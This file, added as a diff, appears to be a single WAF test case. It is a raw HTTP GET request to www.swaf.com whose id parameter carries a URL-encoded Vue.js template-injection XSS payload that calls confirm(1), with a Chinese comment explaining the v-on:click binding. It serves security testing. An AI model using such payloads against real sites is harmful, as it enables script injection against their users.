@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_VueJS-06506724
+# v-on:click='_b.constructorconfirm(1)()' 是一个事件绑定指令，表示当点击 <x> 元素时，触发一个特定的事件处理函数。
+GET /?id=%3Cx%20v-on:click=%27_b.constructor%60confirm%281%29%60%28%29%27%3Eclick%3C%2Fx%3E&bid=hd_tag_m8mv25fx HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25fx
+RM-PRO-Token: 007272df0481c7be4ebae79cd8b2d371
+RM-PRO-Time: 1742808466021
+User-Agent: curl/7.83.1
+
